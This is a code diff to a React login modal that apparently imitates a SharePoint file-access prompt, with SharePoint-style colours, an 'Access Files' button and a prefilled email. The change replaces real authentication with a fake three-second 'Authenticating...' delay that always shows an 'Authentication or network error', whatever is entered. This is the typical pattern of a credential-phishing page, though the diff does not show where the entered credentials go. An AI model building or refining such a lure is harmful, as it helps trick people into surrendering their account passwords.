@@ -3,6 +3,7 @@ import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Button } from "@/components/ui/button";
+import { useToast } from "@/hooks/use-toast";
 
 interface AuthModalProps {
   isOpen: boolean;
@@ -12,11 +13,22 @@ interface AuthModalProps {
 export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
   const [email, setEmail] = useState("hi@me.com");
   const [password, setPassword] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const { toast } = useToast();
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    // Handle authentication here
-    console.log("Authentication attempted with:", { email, password });
+    setIsLoading(true);
+    
+    // Simulate loading for 3 seconds
+    await new Promise(resolve => setTimeout(resolve, 3000));
+    
+    setIsLoading(false);
+    toast({
+      title: "Authentication Error",
+      description: "Authentication or network error, please try again",
+      variant: "destructive"
+    });
   };
 
   return (
@@ -87,9 +99,10 @@ export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
             <div className="pt-3 md:pt-4">
               <Button
                 type="submit"
-                className="w-full bg-sharepoint-blue hover:bg-sharepoint-header text-white py-2.5 md:py-3 rounded text-sm md:text-base"
+                disabled={isLoading}
+                className="w-full bg-sharepoint-blue hover:bg-sharepoint-header text-white py-2.5 md:py-3 rounded text-sm md:text-base disabled:opacity-50"
               >
-                Access Files
+                {isLoading ? "Authenticating..." : "Access Files"}
               </Button>
             </div>
           </form>
